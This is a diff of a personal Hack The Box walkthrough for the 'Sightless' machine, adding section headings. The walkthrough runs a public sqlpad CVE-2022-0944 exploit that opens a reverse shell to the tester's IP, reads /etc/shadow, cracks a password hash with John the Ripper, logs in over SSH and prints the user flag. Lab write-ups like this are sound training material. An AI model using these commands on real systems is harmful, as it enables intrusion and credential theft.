@@ -1,5 +1,5 @@
-
-https://app.hackthebox.com/machines/Sightless
+[![](Pasted%20image%2020241020205537.png)](https://app.hackthebox.com/machines/Sightless)
+# Recon
 
 - Nmap scan
 
@@ -36,9 +36,13 @@ Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 
 - checking http://sightless.htb
 - fond http://sqlpad.sightless.htb/
+
+# Vulnerability Discovery
+
 - fond vulnerability in sqlpad - [here](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)
 - found more info about the vulnerability - [here](https://github.com/shhrew/CVE-2022-0944?tab=readme-ov-file)
-- exploit worked
+
+# Exploitation
 
 > python3 main.py http://sqlpad.sightless.htb/ 10.10.16.30 9999            
 ```
@@ -68,6 +72,8 @@ uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
 
+# Post-Exploitation
+
 - checking /etc/shadow file
 
 > cat /etc/shadow
@@ -96,8 +102,9 @@ michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDE
 ```
 
 - seems like user flags can be cracked by john the ripper
+- store michael and root line in hash.txt and use john
 
-> john hash -w=/usr/share/wordlists/rockyou.txt    
+> john hash.txt -w=/usr/share/wordlists/rockyou.txt    
 ```
 Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
 Use the "--format=HMAC-SHA256" option to force loading these as that type instead
@@ -113,6 +120,8 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
+# CTUF 
+
 - after ssh-ing michael I found the user flag
 
 > ssh michael@10.10.11.32 
@@ -125,3 +134,6 @@ michael@sightless:~$ cat user.txt
 4e365dc2a4a1350b73e96c3e232fe9e2
 ```
 
+# Privilege Escalation
+
+- TBD
